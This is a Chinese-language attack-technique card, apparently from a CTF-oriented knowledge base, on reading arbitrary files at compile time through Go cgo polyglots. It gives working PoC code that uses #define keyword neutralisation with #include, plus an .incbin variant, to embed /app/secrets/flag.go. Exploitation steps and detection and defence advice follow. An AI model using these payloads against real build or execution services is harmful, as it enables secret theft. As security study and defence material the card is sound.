---
id: web-golang-cgo-polyglot-compile-time-file-read
title: 'Go 编译服务 cgo Polyglot：宏定义改写与 #include/.incbin 编译期读取任意文件'
type: scenario
domain: web
path: web/golang
technique: cgo-polyglot-file-inclusion
aliases:
- Go polyglot
- cgo polyglot
- go build 文件包含
- cgo
- .incbin 文件嵌入
tags:
- go
- golang
- cgo
- polyglot
- file-read
- compile-time
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V19
  verified_at: '2026-11-05T02:09:58+08:00'
  notes: 已对照原文及两张webhook截图核对；cgo preamble宏中和Go关键字、#include读flag.go、.incbin变体均与原文一致；flag回传截图显示利用已打通；未复跑PoC
---

## 一句话结论

当服务把攻击者提交的 Go 源码交给 `go build` 且 cgo 可用时，可在 `import "C"` 前的注释里用 C 预处理宏中和 Go 关键字，再 `#include` 任意本地文件，把文件内容编译进二进制后外带。

## 原理

cgo 规定 `import "C"` 紧邻上方的注释块会被当作 C 代码（preamble）交给系统 C 编译器编译。该注释块因此可以包含 `#include`、`#define`、`__asm__` 等预处理指令。

被包含的文件不需要是合法 C 文件，只要能在预处理后被 C 编译器接受或绕过语法即可：

- 若目标是 Go 源文件（如 `package secrets; var Flag = "..."`），先用 `#define package`、`#define secrets`、`#define var char*` 把 Go 关键字宏定义为空或 C 类型，预处理器替换后 C 看到的就只剩 `char* Flag = "..."`；
- Go 与 C 的字符串字面量语法兼容，因此拼接后的文件同时能被 Go 工具链解析（作为为 cgo 生成的包）和被 C 编译器接受，即 polyglot；
- 再加上 `#include <stdio.h>` 与 `void printflag(){puts(Flag);}`，最终二进制在运行时打印出被包含文件里的秘密。

对于不能转成合法 C 的任意二进制/文本，可用内联汇编的 `.incbin "path"` 伪指令把目标文件原样嵌入二进制，再用 `strings` 或外带整个二进制读取。

本链成立的关键是：`go build` 在 cgo 开启时会调用系统 C 编译器，而 C 预处理器的 `#include` 不受 Go 的包可见性/模块边界限制，直接按文件系统路径读取。

## 触发条件

- 攻击者可控制提交给 `go build`/`go run` 的源码内容；
- 构建环境 `CGO_ENABLED=1` 且有 gcc/clang（官方 Go 镜像默认具备）；
- 目标文件的绝对/相对路径可猜解且构建用户可读；
- 构建产物可回传（如服务把二进制 POST 给外部 agent）或错误信息可回显。

## 利用步骤

1. 确认提交的 Go 代码会被实际编译执行（例如 C2 的 `/execute` 接口）；
2. 用公开注册接口获得合法的 agent UUID，或直接找到编译入口；
3. 提交包含 cgo preamble 的 Go 源码，`#define` 中和 `package`/`secrets`/`var` 等关键字；
4. `#include` 目标文件，并在 C 函数中 `puts` 该变量；
5. 编译成功后二进制被发送到攻击者控制的地址，运行/查看输出获得文件内容。

## PoC

```go
package main

/*
#define package
#define secrets
#define var char*
#include "/app/secrets/flag.go"
#include <stdio.h>
void printflag(){puts(Flag);}
*/
import "C"

func main() { C.printflag() }
```

目标文件形如：

```go
package secrets
var Flag = "flag{...}"
```

任意二进制文件改用 `.incbin`：

```go
package main

/*
__asm__ (
    ".incbin \"/app/secrets/flag.go\"\n"
);
*/
import "C"

func main() {}
```

之后对产物执行 `strings` 或直接回传产物即可读取嵌入内容。

## 变体与关联

- 变体：`#include` 读任意合法 C 头/源；`.incbin` 读任意二进制；`__asm__` 内联汇编直接调用 `open/read/write`；
- 关联：任意文件读取、源码/配置泄露、CI 构建投毒；若编译服务同时能出网，可把文件内容直接发往外部；
- 与 SSRF 组合：先用 SSRF 绕过仅 localhost 可达的编译/执行接口，再提交本载荷（见 web/generic/ssrf 的 curl gopher 卡）。

## 检测与防御

- 检测：构建日志中出现 gcc/cc 调用、`import "C"`、`#include "`、`.incbin`；构建产物异常增大；提交源码包含预处理指令；
- 防御：不可信代码只在禁用 cgo（`CGO_ENABLED=0`）的沙箱中构建；构建容器不挂载秘密、无出网、只读文件系统；限制可访问路径（chroot/最小挂载）；对提交源码做字符与指令白名单；构建产物落盘前扫描；
- 架构：秘密不放在构建机文件系统，改用运行时注入或密钥服务。
